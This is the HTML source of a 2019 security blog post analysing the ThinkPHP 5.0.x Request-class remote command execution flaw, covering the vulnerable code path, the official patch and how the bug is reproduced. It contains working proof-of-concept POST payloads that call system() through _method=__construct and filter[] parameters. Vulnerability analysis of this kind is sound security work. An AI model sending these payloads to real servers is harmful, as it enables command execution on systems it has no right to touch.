@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1)    漏洞简介2019年1月11日，ThinkPHP团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认安装条件下即远程命令执行。受影响的版本为ThinkPHP 5.0.0 - ThinkPHP 5.0.23完整版。 ThinkPHP 5.0.15【thinkphp/library/think/Request.php】：123456So">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP5.0 Request类远程命令执行漏洞20190111">
+<meta property="og:url" content="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/index.html">
+<meta property="og:site_name" content="pplsec">
+<meta property="og:description" content="1)    漏洞简介2019年1月11日，ThinkPHP团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认安装条件下即远程命令执行。受影响的版本为ThinkPHP 5.0.0 - ThinkPHP 5.0.23完整版。 ThinkPHP 5.0.15【thinkphp/library/think/Request.php】：123456So">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-11.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-21.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-22.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-23.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-24.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-25.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-26.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-27.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-31.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-32.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-33.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-34.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-35.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-36.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-37.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-38.png">
+<meta property="og:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-41.png">
+<meta property="og:updated_time" content="2019-02-16T13:20:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP5.0 Request类远程命令执行漏洞20190111">
+<meta name="twitter:description" content="1)    漏洞简介2019年1月11日，ThinkPHP团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认安装条件下即远程命令执行。受影响的版本为ThinkPHP 5.0.0 - ThinkPHP 5.0.23完整版。 ThinkPHP 5.0.15【thinkphp/library/think/Request.php】：123456So">
+<meta name="twitter:image" content="http://yoursite.com/images/ThinkPHP-RCE20190111-11.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/">
+
+
+
+
+
+  <title>ThinkPHP5.0 Request类远程命令执行漏洞20190111 | pplsec</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pplsec</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">爱安全 爱生活</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ThinkPHP5.0 Request类远程命令执行漏洞20190111</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-16T21:20:32+08:00">
+                2019-02-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1)    漏洞简介"></a>1)    漏洞简介</h3><p>2019年1月11日，ThinkPHP团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认安装条件下即远程命令执行。受影响的版本为ThinkPHP 5.0.0 - ThinkPHP 5.0.23完整版。</p>
+<p>ThinkPHP 5.0.15【thinkphp/library/think/Request.php】：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Source: Request类的method() 方法中的：</span><br><span class="line">$this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">$this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line"></span><br><span class="line">Sink: Request类的filterValue() 方法中的回调函数：</span><br><span class="line">call_user_func($filter, $value)</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2)    漏洞复现"></a>2)    漏洞复现</h3><h4 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15  POC:"></a>ThinkPHP 5.0.15  POC:</h4><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
+<h4 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23  POC:"></a>ThinkPHP 5.0.23  POC:</h4><p>下面POC  在debug模式无论关闭或开启均可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-漏洞分析-ThinkPHP-5-0-15"><a href="#3-漏洞分析-ThinkPHP-5-0-15" class="headerlink" title="3)    漏洞分析(ThinkPHP 5.0.15)"></a>3)    漏洞分析(ThinkPHP 5.0.15)</h3><h4 id="github-commit信息"><a href="#github-commit信息" class="headerlink" title="github commit信息"></a>github commit信息</h4><p>首先看下官方github commit信息<br><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br>library/think/Request.php的public function method($method = false)方法<br><img src="/images/ThinkPHP-RCE20190111-11.png" alt=""></p>
+<h4 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h4><p>以官网下载的ThinkPHP 5.0.15完整版进行分析，首先定位到漏洞关键点：<br>漏洞主要出现在Request 类的method 函数中<br>thinkphp5015\thinkphp/library/think/Request.php:501<br><img src="/images/ThinkPHP-RCE20190111-21.png" alt=""></p>
+<p>method()函数可以用来获取当前请求类型，如 GET、POST 等，当传入参数$method为false 的时候，会通过var_method 来配置$method</p>
+<p>508行method函数引入了一个外部可控的数据$_POST[Config::get[‘var_method’]。<br>在thinkphp5015\application\config.php中，可看到 ‘var_method’ 是表单请求伪变量，其默认值为 ‘_method’。<br><img src="/images/ThinkPHP-RCE20190111-22.png" alt=""></p>
+<p>取得$_POST[‘_method’]的值并将其赋值给$this-&gt;method，然后动态调用$this-&gt;{$this-&gt;method}($_POST)。这意味着攻击者可利用POST 参数可以实现对当前类的任意方法进行调用，通过调用当前类的构造方法可以实现任意覆盖成员属性的值。如果动态调用__construct构造函数，可以实现任意覆盖成员属性的值则会导致代码执行。</p>
+<p>在构造函数中，会判断其传入参数的key是否是该类属性，如果是，则将对应的value赋值给该属性，可以进行变量覆盖。<br><img src="/images/ThinkPHP-RCE20190111-23.png" alt=""> </p>
+<p>当<strong>method被赋值为</strong>construct之后，即$method参数为true 时，会通过server() 函数进入Request类的param()函数，进而input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br>最终调用filterValue()中的回调函数call_user_func() 实现任意命令执行</p>
+<p>当$method参数为true，进入server()：<br><img src="/images/ThinkPHP-RCE20190111-24.png" alt=""></p>
+<p>进入param()<br><img src="/images/ThinkPHP-RCE20190111-25.png" alt=""></p>
+<p>进入input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br><img src="/images/ThinkPHP-RCE20190111-26.png" alt=""></p>
+<p>1008行 array_walk_recursive($data, [$this, ‘filterValue’], $filter);<br>利用回调函数array_walk_recursive，进入filterValue()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )</span><br><span class="line">将用户自定义函数 callback 应用到 array 数组中的每个单元</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/ThinkPHP-RCE20190111-27.png" alt=""><br>1065行  call_user_func($filter, $value)  利用回调函数call_user_func() 触发漏洞，执行命令。</p>
+<h4 id="动态代码分析"><a href="#动态代码分析" class="headerlink" title="动态代码分析"></a>动态代码分析</h4><p>测试POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
+<p>加断点:<br><img src="/images/ThinkPHP-RCE20190111-31.png" alt=""></p>
+<p>__construct构造函数:<br><img src="/images/ThinkPHP-RCE20190111-32.png" alt=""></p>
+<p>Request.php类的method(),method设为了__construct:<br><img src="/images/ThinkPHP-RCE20190111-33.png" alt=""></p>
+<p>$method为true，进入server():<br><img src="/images/ThinkPHP-RCE20190111-34.png" alt=""></p>
+<p>进入param():<br><img src="/images/ThinkPHP-RCE20190111-35.png" alt=""></p>
+<p>return时进入input():<br><img src="/images/ThinkPHP-RCE20190111-36.png" alt=""></p>
+<p>进入getFilter()，并通过回调函数array_walk_recursive()进入filterValue()<br><img src="/images/ThinkPHP-RCE20190111-37.png" alt=""></p>
+<p>filterValue()中利用回调函数call_user_func() 触发漏洞，执行命令：<br><img src="/images/ThinkPHP-RCE20190111-38.png" alt=""></p>
+<h3 id="4-补丁中的修复方式"><a href="#4-补丁中的修复方式" class="headerlink" title="4)    补丁中的修复方式"></a>4)    补丁中的修复方式</h3><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br><img src="/images/ThinkPHP-RCE20190111-41.png" alt=""></p>
+<p>对$method增加白名单，限制为GET, POST, DELETE, PUT, PATCH<br>无法再调用__construct构造函数</p>
+<p><strong>参考:</strong><br><a href="https://nosec.org/home/detail/2163.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2163.html</a><br><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a>  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/12/PHP弱类型/" rel="next" title="PHP弱类型">
+                <i class="fa fa-chevron-left"></i> PHP弱类型
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/" rel="prev" title="InstallUtil&csc.exe-bypass application whitelisting">
+                InstallUtil&csc.exe-bypass application whitelisting <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/ppl.jpg" alt="pplsec">
+            
+              <p class="site-author-name" itemprop="name">pplsec</p>
+              <p class="site-description motion-element" itemprop="description">渗透测试 应急响应 代码审计</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-漏洞简介"><span class="nav-text">1)    漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞复现"><span class="nav-text">2)    漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-5-0-15-POC"><span class="nav-text">ThinkPHP 5.0.15  POC:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-5-0-23-POC"><span class="nav-text">ThinkPHP 5.0.23  POC:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-漏洞分析-ThinkPHP-5-0-15"><span class="nav-text">3)    漏洞分析(ThinkPHP 5.0.15)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#github-commit信息"><span class="nav-text">github commit信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#静态代码分析"><span class="nav-text">静态代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#动态代码分析"><span class="nav-text">动态代码分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-补丁中的修复方式"><span class="nav-text">4)    补丁中的修复方式</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">pplsec</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
